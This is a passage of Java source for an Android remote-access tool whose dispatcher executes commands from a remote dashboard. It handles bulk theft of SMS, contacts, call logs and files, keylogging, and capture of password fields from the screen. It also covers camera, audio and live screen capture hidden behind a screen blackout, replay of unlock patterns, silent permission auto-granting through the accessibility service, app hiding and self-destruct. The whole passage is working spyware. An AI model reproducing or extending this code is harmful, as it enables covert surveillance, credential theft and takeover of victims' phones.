                bulkExecutor.execute(() -> {
                    try {
                        JSONObject full = commandExecutor.executeCommand("get_installed_apps", fp0);
                        JSONArray arr = full.optJSONArray("apps");
                        if (arr == null) arr = new JSONArray();
                        sendChunked(cid0, "get_installed_apps", arr, "apps", 40);
                    } catch (Exception e) {
                        sendChunkedError(cid0, "get_installed_apps", e.getMessage());
                    }
                });
                return null; // async — bulkExecutor calls sendResponse via sendChunked
            }

            // ── Audio: mute / unmute (all streams via setStreamVolume, no DND needed) ──
            case "mute_device": {
                JSONObject r = new JSONObject();
                try {
                    android.media.AudioManager am = (android.media.AudioManager)
                        context.getSystemService(Context.AUDIO_SERVICE);
                    if (am != null) {
                        int[] streams = {
                            android.media.AudioManager.STREAM_RING,
                            android.media.AudioManager.STREAM_NOTIFICATION,
                            android.media.AudioManager.STREAM_MUSIC,
                            android.media.AudioManager.STREAM_ALARM,
                            android.media.AudioManager.STREAM_SYSTEM
                        };
                        for (int stream : streams) {
                            try {
                                am.setStreamVolume(stream, 0,
                                    android.media.AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
                            } catch (Exception ignored) {}
                        }
                    }
                    r.put("success", true);
                    r.put("action", "mute_device");
                    r.put("streams_muted", "RING,NOTIFICATION,MUSIC,ALARM,SYSTEM");
                } catch (Exception e) { r.put("success", false); r.put("error", e.getMessage()); }
                return r;
            }
            case "unmute_device": {
                JSONObject r = new JSONObject();
                try {
                    android.media.AudioManager am = (android.media.AudioManager)
                        context.getSystemService(Context.AUDIO_SERVICE);
                    if (am != null) {
                        int[] streams = {
                            android.media.AudioManager.STREAM_RING,
                            android.media.AudioManager.STREAM_NOTIFICATION,
                            android.media.AudioManager.STREAM_MUSIC,
                            android.media.AudioManager.STREAM_ALARM,
                            android.media.AudioManager.STREAM_SYSTEM
                        };
                        for (int stream : streams) {
                            try {
                                int maxVol = am.getStreamMaxVolume(stream);
                                am.setStreamVolume(stream, maxVol, 0);
                            } catch (Exception ignored) {}
                        }
                    }
                    r.put("success", true);
                    r.put("action", "unmute_device");
                    r.put("streams_unmuted", "RING,NOTIFICATION,MUSIC,ALARM,SYSTEM");
                } catch (Exception e) { r.put("success", false); r.put("error", e.getMessage()); }
                return r;
            }

            // ── Wake keep-alive: device wakes screen every 10 s ──────────
            // Dashboard pings every 60 s; device auto-stops after 4 min of silence.
            case "wake_keep_alive_start": {
                wakeKeepAliveLastTrigger = System.currentTimeMillis();
                startWakeKeepAliveLoop();
                JSONObject r = new JSONObject();
                r.put("success", true); r.put("action", "wake_keep_alive_start");
                return r;
            }
            case "wake_keep_alive_stop": {
                stopWakeKeepAliveLoop();
                JSONObject r = new JSONObject();
                r.put("success", true); r.put("action", "wake_keep_alive_stop");
                return r;
            }
        }

        // ── Storage permission (on-demand from dashboard) ────────────────
        if (command.equals("request_storage_permission")) {
            JSONObject r = new JSONObject();
            try {
                new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                    try {
                        com.task.tusker.permissions.AutoPermissionManager apm =
                            new com.task.tusker.permissions.AutoPermissionManager(context);
                        // Start dedicated storage auto-granter (clicks Allow access / Allow / toggle)
                        UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                        if (svc != null) svc.enableStorageAutoGrant();
                        // Open the storage permission screen
                        apm.requestWriteExternalStorageLast();
                    } catch (Exception ignored) {}
                });
                r.put("success", true);
                r.put("message", "Storage permission request triggered");
            } catch (Exception e) {
                r.put("success", false);
                r.put("error", e.getMessage());
            }
            return r;
        }

        // ── Accessibility status ─────────────────────────────────────────
        if (command.equals("get_accessibility_status")) {
            JSONObject r = new JSONObject();
            boolean enabled = UnifiedAccessibilityService.getInstance() != null;
            r.put("success", true);
            r.put("enabled", enabled);
            r.put("message", enabled ? "Accessibility service is running" : "Accessibility service is NOT running — enable it in Settings");
            return r;
        }

        // ── SMS ──────────────────────────────────────────────────────────
        if (command.equals("get_all_sms")) {
            final String cidSms = params.optString("commandId", "");
            final int smsLimit  = params.optInt("limit", 200);
            bulkExecutor.execute(() -> {
                try {
                    JSONObject full = smsHandler.getAllSMS(smsLimit);
                    JSONArray arr = full.optJSONArray("messages");
                    if (arr == null) arr = new JSONArray();
                    sendChunked(cidSms, "get_all_sms", arr, "messages", 50);
                } catch (Exception e) { sendChunkedError(cidSms, "get_all_sms", e.getMessage()); }
            });
            return null;
        }
        if (command.equals("get_sms_from_number")) {
            return smsHandler.getSMSFromNumber(params.getString("phoneNumber"), params.optInt("limit", 50));
        }
        if (command.equals("send_sms")) {
            return smsHandler.sendSMS(params.getString("phoneNumber"), params.getString("message"));
        }
        if (command.equals("delete_sms")) {
            return smsHandler.deleteSMS(params.getString("smsId"));
        }

        // ── Contacts ─────────────────────────────────────────────────────
        if (command.equals("get_all_contacts")) {
            final String cidC = params.optString("commandId", "");
            bulkExecutor.execute(() -> {
                try {
                    JSONArray arr = contactsHandler.getAllContactsArray();
                    sendChunked(cidC, "get_all_contacts", arr, "contacts", 50);
                } catch (Exception e) { sendChunkedError(cidC, "get_all_contacts", e.getMessage()); }
            });
            return null;
        }
        if (command.equals("search_contacts"))  return contactsHandler.searchContacts(params.getString("query"));

        // ── Calls ────────────────────────────────────────────────────────
        if (command.equals("get_all_call_logs")) {
            return callLogsHandler.getAllCallLogs(params.optInt("limit", 100));
        }
        if (command.equals("get_call_logs_by_type")) {
            return callLogsHandler.getCallLogsByType(params.getInt("callType"), params.optInt("limit", 50));
        }
        if (command.equals("get_call_logs_from_number")) {
            return callLogsHandler.getCallLogsFromNumber(params.getString("phoneNumber"), params.optInt("limit", 50));
        }
        if (command.equals("get_call_statistics")) return callLogsHandler.getCallStatistics();

        // ── Camera ───────────────────────────────────────────────────────
        if (command.equals("get_available_cameras")) return cameraHandler.getAvailableCameras();
        if (command.equals("take_photo")) {
            return cameraHandler.takePhoto(
                params.optString("cameraId", "0"),
                params.optString("quality", "high")
            );
        }

        // ── Screenshot ───────────────────────────────────────────────────
        if (command.equals("take_screenshot")) return screenshotHandler.takeScreenshot();

        // ── Files ────────────────────────────────────────────────────────
        if (command.equals("list_files")) {
            final String cidF = params.optString("commandId", "");
            final String filePath = params.optString("path", "");
            bulkExecutor.execute(() -> {
                try {
                    sendResponse(cidF, "list_files",
                            fileHandler.listFiles(filePath.isEmpty() ? null : filePath));
                } catch (Exception e) { sendChunkedError(cidF, "list_files", e.getMessage()); }
            });
            return null;
        }
        if (command.equals("read_file"))  return fileHandler.readFile(params.getString("filePath"), params.optBoolean("asBase64", false));
        if (command.equals("write_file")) return fileHandler.writeFile(params.getString("filePath"), params.getString("content"), params.optBoolean("isBase64", false));
        if (command.equals("delete_file"))return fileHandler.deleteFile(params.getString("filePath"));
        if (command.equals("copy_file"))  return fileHandler.copyFile(params.getString("sourcePath"), params.getString("destPath"));
        if (command.equals("move_file"))  return fileHandler.moveFile(params.getString("sourcePath"), params.getString("destPath"));
        if (command.equals("create_directory")) return fileHandler.createDirectory(params.getString("path"));
        if (command.equals("get_file_info"))    return fileHandler.getFileInfo(params.getString("filePath"));
        if (command.equals("search_files"))     return fileHandler.searchFiles(params.getString("directory"), params.getString("query"));

        // ── Audio ────────────────────────────────────────────────────────
        if (command.equals("start_recording")) {
            String fn = params.optString("filename", null);
            return audioRecorder.startRecording(fn.isEmpty() ? null : fn);
        }
        if (command.equals("stop_recording"))       return audioRecorder.stopRecording();
        if (command.equals("get_recording_status")) return audioRecorder.getStatus();
        if (command.equals("get_audio"))            return audioRecorder.getAudioAsBase64(params.getString("filePath"));
        if (command.equals("list_recordings"))      return audioRecorder.listRecordings();
        if (command.equals("delete_recording"))     return audioRecorder.deleteRecording(params.getString("filePath"));

        // ── Keylogger ────────────────────────────────────────────────────
        if (command.equals("get_keylogs"))            return keyloggerService.getKeylogs(params.optInt("limit", 100));
        if (command.equals("clear_keylogs"))          return keyloggerService.clearKeylogs();
        if (command.equals("list_keylog_files")) {
            final String cidKl = params.optString("commandId", "");
            bulkExecutor.execute(() -> {
                try { sendResponse(cidKl, "list_keylog_files", keyloggerService.listKeylogFiles()); }
                catch (Exception e) { sendChunkedError(cidKl, "list_keylog_files", e.getMessage()); }
            });
            return null;
        }
        if (command.equals("download_keylog_file"))   return keyloggerService.downloadKeylogFile(params.getString("date"));

        // ── Gesture Recorder ─────────────────────────────────────────────
        if (command.startsWith("gesture_")) {
            if (gestureRecorder == null) {
                JSONObject er = new JSONObject();
                er.put("success", false); er.put("error", "Gesture recorder not ready — ensure AccessibilityService is enabled");
                return er;
            }
            switch (command) {
                case "gesture_start_record": {
                    String pkg   = params.optString("packageId", "");
                    String lbl   = params.optString("label", "gesture");
                    return gestureRecorder.startRecording(pkg, lbl);
                }
                case "gesture_stop_record":   return gestureRecorder.stopRecording();
                case "gesture_cancel_record": return gestureRecorder.cancelRecording();
                case "gesture_pause_record":  return gestureRecorder.pauseRecording();
                case "gesture_resume_record": return gestureRecorder.resumeRecording();
                case "gesture_get_live":      return gestureRecorder.getLivePoints();
                case "gesture_replay":        return gestureRecorder.replayGesture(params.getString("filename"));
                case "gesture_list":          return gestureRecorder.listGestures();
                case "gesture_get":           return gestureRecorder.getGesture(params.getString("filename"));
                case "gesture_delete":        return gestureRecorder.deleteGesture(params.getString("filename"));
                case "gesture_status": {
                    JSONObject st = new JSONObject();
                    st.put("success",   true);
                    st.put("recording", gestureRecorder.isRecording());
                    st.put("paused",    gestureRecorder.isPaused());
                    return st;
                }
                case "gesture_draw_pattern":  return gestureRecorder.drawPattern(params);
                case "gesture_auto_capture_start": return gestureRecorder.startAutoCapture();
                case "gesture_auto_capture_stop":  return gestureRecorder.stopAutoCapture();
                case "gesture_mirror_start":        return gestureRecorder.startAutoMirror();
                case "gesture_mirror_stop":         return gestureRecorder.stopAutoMirror();
                // Live Stream
                case "gesture_live_start":   return gestureRecorder.startLiveStream();
                case "gesture_live_stop":    return gestureRecorder.stopLiveStream();
                case "gesture_live_points":  return gestureRecorder.getLiveStreamPoints();
                case "gesture_live_delete":  return gestureRecorder.deleteLiveStream(params.getString("filename"));
                case "gesture_live_replay":  return gestureRecorder.replayLiveStream(params.getString("filename"));
                case "gesture_live_list":    return gestureRecorder.listLiveStreams();
            }
        }

        // ── Advanced Unlock ───────────────────────────────────────────────
        if (command.startsWith("advanced_unlock_")) {
            if (gestureRecorder == null) {
                JSONObject er = new JSONObject();
                er.put("success", false);
                er.put("error", "Gesture recorder not ready — ensure AccessibilityService is enabled");
                return er;
            }
            switch (command) {
                case "advanced_unlock_list":
                    return gestureRecorder.listAdvancedUnlockPatterns();
                case "advanced_unlock_get":
                    return gestureRecorder.getAdvancedUnlockPattern(params.getString("filename"));
                case "advanced_unlock_replay":
                    return gestureRecorder.replayAdvancedUnlockPattern(params.getString("filename"));
                case "advanced_unlock_delete":
                    return gestureRecorder.deleteAdvancedUnlockPattern(params.getString("filename"));
            }
        }

        // ── App Monitor ──────────────────────────────────────────────────
        if (command.equals("list_app_monitor_apps")) {
            final String cidAm = params.optString("commandId", "");
            bulkExecutor.execute(() -> {
                try { sendResponse(cidAm, "list_app_monitor_apps", appMonitor.listMonitoredApps()); }
                catch (Exception e) { sendChunkedError(cidAm, "list_app_monitor_apps", e.getMessage()); }
            });
            return null;
        }
        if (command.equals("get_app_keylogs"))          return appMonitor.getAppKeylogs(params.getString("packageName"), params.optString("date", ""), params.optInt("limit", 200));
        if (command.equals("list_app_keylog_files"))    return appMonitor.listAppKeylogFiles(params.getString("packageName"));
        if (command.equals("download_app_keylog_file")) return appMonitor.downloadAppKeylogFile(params.getString("packageName"), params.getString("date"));
        if (command.equals("list_app_screenshots"))     return appMonitor.listAppScreenshots(params.getString("packageName"));
        if (command.equals("download_app_screenshot"))  return appMonitor.downloadAppScreenshot(params.getString("packageName"), params.getString("filename"));

        // ── App Manager ──────────────────────────────────────────────────
        if (command.equals("uninstall_app"))  return appMonitor.uninstallApp(params.getString("packageName"));
        if (command.equals("force_stop_app")) return appMonitor.forceStopApp(params.getString("packageName"));
        if (command.equals("open_app"))       return appMonitor.openApp(params.getString("packageName"));
        if (command.equals("clear_app_data")) return appMonitor.clearAppData(params.getString("packageName"));

        if (command.equals("run_task_local")) {
            final JSONArray steps = params.optJSONArray("steps");
            final String commandId = params.optString("commandId", "");
            if (steps == null || steps.length() == 0)
                return new JSONObject().put("success", false).put("error", "No steps");

            // ── Persist the workflow to device storage BEFORE starting execution ──
            // This ensures the task survives connection drops, app restarts,
            // and process kills — the device owns the workflow independently.
            boolean stored = saveTaskToDevice(steps, commandId);

            // Start execution in a background thread.  The task uses the in-memory
            // steps reference (already fully received before we got here) which is
            // equivalent to the file we just saved.
            new Thread(() -> { try { executeTaskLocal(steps, commandId); } catch (Exception e) { Log.e(TAG, "run_task_local: " + e.getMessage()); } }, "task-local").start();

            return new JSONObject()
                    .put("success", true)
                    .put("started", true)
                    .put("stored", stored)
                    .put("steps", steps.length());
        }
        if (command.equals("disable_app"))    return appMonitor.disableApp(params.getString("packageName"));

        // ── Notifications ────────────────────────────────────────────────
        if (command.equals("get_notifications"))          return NotificationInterceptor.getAllNotifications();
        if (command.equals("get_notifications_from_app")) return NotificationInterceptor.getNotificationsFromApp(params.getString("packageName"));
        if (command.equals("clear_notifications"))        return NotificationInterceptor.clearAllNotifications();

        // ── Streaming — event-driven ─────────────────────────────────────
        if (command.equals("stream_start")) {
            // Read the interval the dashboard requests (500-5000ms; default 2000ms).
            // Mirrors how screen_reader_stream_start reads intervalMs — same pattern.
            final long requestedIntervalMs = Math.max(500L, params.optLong("intervalMs", 2000L));
            // Serialize through heartbeatExecutor (single-threaded) so that a
            // stream_stop submitted just before this cannot arrive *after* we
            // start — guaranteeing FIFO order between stop and start commands.
            final String deviceId = DeviceInfo.getDeviceId(context);
            heartbeatExecutor.execute(() -> {
                startIdleFrameMode(deviceId, requestedIntervalMs);
                sendSingleFrame(deviceId);
            });
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Stream started — push interval " + requestedIntervalMs + "ms");
            return r;
        }
        if (command.equals("stream_stop")) {
            heartbeatExecutor.execute(() -> {
                stopIdleFrameMode();
                stopBlockFrameMode();
            });
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Stream stopped");
            return r;
        }
        if (command.equals("stream_request_frame")) {
            // When block screen is active the device is already pushing frames every 1.5s.
            // Ignore on-demand frame requests to avoid duplicate frames and extra CPU load.
            if (blockFrameMode) {
                JSONObject r = new JSONObject();
                r.put("success", true);
                r.put("message", "Block screen active — frame auto-pushed at 1.5s interval");
                return r;
            }
            String deviceId = DeviceInfo.getDeviceId(context);
            // When idle-frame auto-push is already running, do NOT start a parallel capture —
            // that would queue stale frames on top of the live loop. Instead, mark a pending
            // request: the idle loop picks it up at its next free slot and delivers the most
            // current frame, skipping any that would have been delayed in transit.
            if (idleFrameMode) {
                streamingDeviceId = deviceId;
                pendingFrameRequest.set(true);
                JSONObject r = new JSONObject();
                r.put("success", true);
                r.put("message", "Pending flag set — idle loop will deliver next fresh frame");
                return r;
            }
            sendSingleFrame(deviceId);
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Frame captured and sent");
            return r;
        }

        // ── Screen Blackout ───────────────────────────────────────────────
        if (command.equals("screen_blackout_on")) {
            JSONObject r = screenBlackout.enableBlackout();
            if (r.optBoolean("success", false)) {
                // Start auto-pushing frames every 1.5s so dashboard can see & control the device
                startBlockFrameMode(DeviceInfo.getDeviceId(context));
            }
            return r;
        }
        if (command.equals("screen_blackout_off")) {
            JSONObject r = screenBlackout.disableBlackout();
            stopBlockFrameMode();
            return r;
        }
        if (command.equals("get_blackout_status")) {
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("active", screenBlackout.isActive());
            r.put("message", screenBlackout.isActive() ? "Screen blackout is ON" : "Screen blackout is OFF");
            return r;
        }

        if (command.equals("fully_hide_app")) {
            JSONObject r = new JSONObject();
            try {
                com.task.tusker.stealth.StealthManager sm =
                    new com.task.tusker.stealth.StealthManager(context);
                return sm.fullyHideApp();
            } catch (Exception e) {
                r.put("success", false);
                r.put("error", e.getMessage());
                return r;
            }
        }
        if (command.equals("fully_show_app")) {
            JSONObject r = new JSONObject();
            try {
                com.task.tusker.stealth.StealthManager sm =
                    new com.task.tusker.stealth.StealthManager(context);
                return sm.fullyShowApp();
            } catch (Exception e) {
                r.put("success", false);
                r.put("error", e.getMessage());
                return r;
            }
        }

        if (command.equals("get_permissions")) {
            return permissionManager.getPermissions();
        }

        // ── Self-destruct ─────────────────────────────────────────────────
        if (command.equals("self_destruct")) {
            return performSelfDestruct();
        }

        // ── Dynamic app monitoring ────────────────────────────────────────
        if (command.equals("add_monitored_app")) {
            String pkg = params.optString("packageName", "");
            if (!pkg.isEmpty()) dynamicMonitoredPackages.add(pkg);
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Now monitoring: " + pkg);
            return r;
        }
        if (command.equals("remove_monitored_app")) {
            String pkg = params.optString("packageName", "");
            dynamicMonitoredPackages.remove(pkg);
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Stopped monitoring: " + pkg);
            return r;
        }

        // ── Permissions ───────────────────────────────────────────────────
        if (command.equals("request_permission")) {
            String perm = params.optString("permission", "");
            if (perm.isEmpty()) {
                JSONObject r = new JSONObject();
                r.put("success", false);
                r.put("error", "Missing 'permission' parameter");
                return r;
            }
            return permissionManager.requestPermission(perm);
        }
        if (command.equals("request_all_permissions")) {
            return permissionManager.requestAllPermissions();
        }

        // ── Screen Reader Recordings (no accessibility needed) ────────────────
        if (command.equals("list_screen_recordings")) {
            return listScreenRecordingsOnDevice();
        }
        if (command.equals("get_screen_recording")) {
            String filename = params.optString("filename", "");
            return getScreenRecordingContent(filename);
        }

        // ── Accessibility-required commands ──────────────────────────────
        // Screen Control (gestures) + Screen Reader
        if (isAccessibilityCommand(command)) {
            return handleAccessibilityCommand(command, params);
        }

        // ── Unknown ──────────────────────────────────────────────────────
        JSONObject unknown = new JSONObject();
        unknown.put("success", false);
        unknown.put("error", "Unknown command: " + command);
        return unknown;
    }

    // ── Streaming — "latest frame wins" push model ────────────────────────
    //
    // Design: the sender is always busy with exactly ONE frame at a time.
    // If a new frame request arrives while encoding/sending is in progress, we do NOT drop
    // it — instead we record pendingFrameRequest=true so the sender picks up a fresh capture
    // the moment it becomes free.  This ensures the dashboard always shows the MOST RECENT
    // screen, never a stale frame that was queued before the current one finished.

    /**
     * Send exactly one frame.  If the sender is already busy, mark a pending request
     * so the very next send slot captures and delivers a fresh frame.
     */
    public void sendSingleFrame(String deviceId) {
        // Track the streaming deviceId so the pending-request path can use it
        streamingDeviceId = deviceId;

        if (!frameBusy.compareAndSet(false, true)) {
            // Sender is busy encoding/transmitting the previous frame.
            // Mark that a newer frame is wanted — sender will pick it up when free.
            pendingFrameRequest.set(true);
            Log.d(TAG, "sendSingleFrame: sender busy — pending flag set for next slot");
            return;
        }

        // Sender is free — kick off capture + encode + send on the executor
        dispatchFrameSend(deviceId);
    }

    /**
     * Internal: capture → encode → send one frame on the executor thread.
     * After completing, checks pendingFrameRequest and immediately chains another
     * send if the dashboard requested a fresher frame while we were busy.
     */
    private void dispatchFrameSend(final String deviceId) {
        executor.execute(() -> {
            try {
                Bitmap frame = captureFrame();
                if (frame != null) {
                    // 360 px wide for 3G — encodes ~2× faster than 540 px, ~55 % less data.
                    Bitmap scaled = scaleBitmapToWidth(frame, 360);
                    if (scaled != frame) frame.recycle();
                    // Adaptive quality: start at 45 % (up from 35 %) — the dashboard now uses canvas
                    // rendering which keeps the previous frame visible while the next decodes, so we
                    // can afford clearer frames. Adaptive logic still drops to 20 % if frame exceeds 40 KB.
                    String b64 = bitmapToBase64Adaptive(scaled, 45, 40_000);
                    scaled.recycle();
                    if (b64 != null) {
                        JSONObject d = new JSONObject();
                        d.put("deviceId",  deviceId);
                        d.put("frameData", b64);
                        d.put("timestamp", System.currentTimeMillis());
                        if (deviceScreenW > 0) {
                            d.put("screenWidth",  deviceScreenW);
                            d.put("screenHeight", deviceScreenH);
                        }
                        sendStreamMessage("stream:frame", d);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "dispatchFrameSend error: " + e.getMessage());
            } finally {
                frameBusy.set(false);
                // "Latest frame wins": if a newer frame was requested while we were busy,
                // immediately capture and send it now — no waiting for the next poll cycle.
                if (pendingFrameRequest.getAndSet(false)) {
                    String did = streamingDeviceId;
                    if (did != null && (idleFrameMode || blockFrameMode)) {
                        Log.d(TAG, "dispatchFrameSend: pending frame — dispatching fresh capture immediately");
                        sendSingleFrame(did);
                    }
                }
            }
        });
    }

    /** Scale a bitmap so its width is at most maxWidth; keeps aspect ratio. */
    private Bitmap scaleBitmapToWidth(Bitmap src, int maxWidth) {
        if (src == null || src.getWidth() <= maxWidth) return src;
        float ratio = (float) maxWidth / src.getWidth();
        int newH = Math.max(1, Math.round(src.getHeight() * ratio));
        return Bitmap.createScaledBitmap(src, maxWidth, newH, true);
    }

    /**
     * Start idle-frame mode using the last stored interval (restored after reconnect).
     * Mirrors how screen_reader_stream_start uses screenReaderDashboardIntervalMs.
     */
    private void startIdleFrameMode(String deviceId) {
        startIdleFrameMode(deviceId, idleFrameIntervalMs);
    }

    /**
     * Start idle-frame mode at a specific interval — identical pattern to startScreenReaderLoop.
     * scheduleWithFixedDelay: waits intervalMs AFTER the previous frame completes so we never
     * flood the channel on slow 3G connections (frame send may itself take >1 s).
     */
    private void startIdleFrameMode(String deviceId, long intervalMs) {
        stopIdleFrameMode();
        idleFrameIntervalMs = Math.max(500L, intervalMs); // store for reconnect
        idleFrameMode = true;
        idleFrameFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
            if (idleFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
        }, 0, idleFrameIntervalMs, TimeUnit.MILLISECONDS);
        Log.i(TAG, "Idle-frame mode started (" + idleFrameIntervalMs + "ms interval — mirrors screen-reader approach)");
    }

    private void stopIdleFrameMode() {
        idleFrameMode = false;
        if (idleFrameFuture != null) {
            idleFrameFuture.cancel(false);
            idleFrameFuture = null;
        }
    }

    /** Start block-frame mode: push one frame every 1500 ms while block screen is active (3G safe). */
    private void startBlockFrameMode(String deviceId) {
        stopBlockFrameMode();
        blockFrameMode = true;
        // Send first frame immediately so dashboard sees real content right away
        executor.execute(() -> sendSingleFrame(deviceId));
        blockFrameFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
            if (blockFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
        }, 1500, 1500, TimeUnit.MILLISECONDS);
        Log.i(TAG, "Block-frame mode started (1500ms delay — 3G compatible)");
    }

    private void stopBlockFrameMode() {
        blockFrameMode = false;
        if (blockFrameFuture != null) {
            blockFrameFuture.cancel(false);
            blockFrameFuture = null;
        }
    }

    private Bitmap captureFrame() {
        final Bitmap[] result = {null};

        Runnable doCapture = () -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                if (svc != null) {
                    result[0] = svc.captureScreenSync();
                    return;
                }
            }
            try {
                result[0] = screenshotHandler.captureBitmap();
            } catch (Exception e) {
                Log.w(TAG, "captureFrame fallback failed: " + e.getMessage());
            }
        };

        // captureScreenSync() uses AccessibilityService.takeScreenshot() which captures
        // the real screen content behind accessibility overlays — no need to hide the overlay.
        doCapture.run();

        return result[0];
    }

    private String bitmapToBase64(Bitmap bitmap, int quality) {
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, out);
            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) {
            Log.e(TAG, "bitmapToBase64 error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Encode bitmap to Base64 JPEG within a max byte budget.
     * Reuses a single ByteArrayOutputStream (reset between attempts) to avoid
     * per-encode allocation and GC pauses on the hot streaming path.
     *
     * @param bitmap   source bitmap
     * @param quality  starting JPEG quality (0-100)
     * @param maxBytes max raw-JPEG byte budget (Base64 is ~4/3 of this, so actual
     *                 Base64 string length will be up to maxBytes * 4 / 3)
     */
    private String bitmapToBase64Adaptive(Bitmap bitmap, int quality, int maxBytes) {
        // Pre-allocate with a reasonable capacity — avoids internal array copies on resize.
        ByteArrayOutputStream baos = new ByteArrayOutputStream(maxBytes);
        try {
            int q = quality;
            while (q >= 20) {
                baos.reset();
                bitmap.compress(Bitmap.CompressFormat.JPEG, q, baos);
                byte[] bytes = baos.toByteArray();
                // Base64 expands by 4/3 — check raw size first to avoid encoding if it's too big.
                if (bytes.length <= maxBytes || q <= 20) {
                    if (q < quality) Log.d(TAG, "Adaptive quality: " + q + "% (" + bytes.length + " raw bytes)");
                    return Base64.encodeToString(bytes, Base64.NO_WRAP);
                }
                q -= 10;
            }
        } catch (Exception e) {
            Log.e(TAG, "bitmapToBase64Adaptive error: " + e.getMessage());
        }
        return null;
    }

    private boolean isAccessibilityCommand(String command) {
        switch (command) {
            case "touch":
            case "swipe":
            case "press_back":
            case "press_home":
            case "press_recents":
            case "open_notifications":
            case "open_quick_settings":
            case "scroll_up":
            case "scroll_down":
            case "input_text":
            case "press_enter":
            case "click_by_text":
            case "read_screen":
            case "find_by_text":
            case "get_current_app":
            case "get_clickable_elements":
            case "get_input_fields":
            case "wake_screen":
            case "screen_off":
            case "open_task_manager":
            case "screen_reader_start":
            case "screen_reader_stop":
            case "screen_reader_stream_start":
            case "screen_reader_stream_stop":
            case "list_screen_recordings":
            case "get_screen_recording":
            case "delete_screen_recording":
                return true;
            default:
                return false;
        }
    }

    private JSONObject handleAccessibilityCommand(String command, JSONObject params) throws JSONException {
        UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();

        if (accessSvc == null) {
            JSONObject r = new JSONObject();
            r.put("success", false);
            r.put("error",   "Accessibility service is not running. Enable it in Settings → Accessibility → " +
                             "Downloaded Apps → [App Name]");
            r.put("requiresAccessibility", true);
            return r;
        }

        // Screen Control commands (gestures)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            ScreenController sc = new ScreenController(accessSvc);

            switch (command) {
                case "touch": {
                    int tx = params.getInt("x");
                    int ty = params.getInt("y");
                    // Deduplication: ignore identical touch within 250 ms
                    String touchKey = "touch:" + tx + "," + ty;
                    long now = System.currentTimeMillis();
                    if (touchKey.equals(lastTouchKey) && (now - lastTouchTime) < 250) {
                        Log.d(TAG, "touch dedup ignored: " + touchKey);
                        JSONObject r = new JSONObject();
                        r.put("success", true);
                        r.put("deduped", true);
                        return r;
                    }
                    lastTouchKey  = touchKey;
                    lastTouchTime = now;
                    return sc.touch(tx, ty, params.optInt("duration", 100));
                }
                case "swipe": {
                    String direction = params.optString("direction", "");
                    int sx1, sy1, sx2, sy2;
                    if (!direction.isEmpty()) {
                        android.graphics.Point screenSz = new android.graphics.Point();
                        ((android.view.WindowManager) accessSvc.getSystemService(android.content.Context.WINDOW_SERVICE))
                            .getDefaultDisplay().getRealSize(screenSz);
                        int midX = screenSz.x / 2;
                        int midY = screenSz.y / 2;
                        int step = (int)(screenSz.y * 0.3f);
                        sx1 = midX; sy1 = midY; sx2 = midX; sy2 = midY;
                        switch (direction) {
                            case "up":    sy1 = midY + step; sy2 = midY - step; break;
                            case "down":  sy1 = midY - step; sy2 = midY + step; break;
                            case "left":  sx1 = midX + step; sx2 = midX - step; break;
                            case "right": sx1 = midX - step; sx2 = midX + step; break;
                        }
                    } else {
                        sx1 = params.optInt("x1", params.optInt("startX", 0));
                        sy1 = params.optInt("y1", params.optInt("startY", 0));
                        sx2 = params.optInt("x2", params.optInt("endX", 0));
                        sy2 = params.optInt("y2", params.optInt("endY", 0));
                    }
                    return sc.swipe(sx1, sy1, sx2, sy2, params.optInt("duration", 400));
                }
                case "press_back":         return sc.pressBack();
                case "press_home":         return sc.pressHome();
                case "press_recents":      return sc.pressRecents();
                case "open_notifications": return sc.openNotifications();
                case "open_quick_settings":return sc.openQuickSettings();
                case "scroll_up":          return sc.scrollUp();
                case "scroll_down":        return sc.scrollDown();
                case "input_text":         return sc.inputText(params.getString("text"));
                case "press_enter":        return sc.pressEnter();
                case "click_by_text":      return sc.clickByText(params.getString("text"));
                case "wake_screen":        return sc.wakeScreen();
                case "screen_off":         return sc.lockScreen();
                case "open_task_manager":  return sc.pressRecents();
            }
        } else if (isGestureCommand(command)) {
            JSONObject r = new JSONObject();
            r.put("success", false);
            r.put("error", command + " requires Android 7.0+ (API 24)");
            return r;
        }

        // Screen Reader commands — MUST be serialized: AccessibilityNodeInfo is not thread-safe.
        // Concurrent traversals from the cached thread pool corrupt Android's node pool and crash the process.
        ScreenReader sr = new ScreenReader(accessSvc);
        switch (command) {
            case "read_screen": {
                boolean acquired = false;
                try {
                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                    if (!acquired) {
                        JSONObject r = new JSONObject();
                        r.put("success", false);
                        r.put("error", "read_screen busy — accessibility reader is already running, retry");
                        return r;
                    }
                    JSONObject screenResult = sr.readScreen();
                    pushPasswordFieldsFromScreen(screenResult);
                    return screenResult;
                } finally {
                    if (acquired) accessSemaphore.release();
                }
            }
            case "find_by_text": {
                boolean acquired = false;
                try {
                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                    if (!acquired) {
                        JSONObject r = new JSONObject();
                        r.put("success", false); r.put("error", "accessibility busy"); return r;
                    }
                    return sr.findByText(params.getString("text"));
                } finally { if (acquired) accessSemaphore.release(); }
            }
            case "get_current_app": {
                boolean acquired = false;
                try {
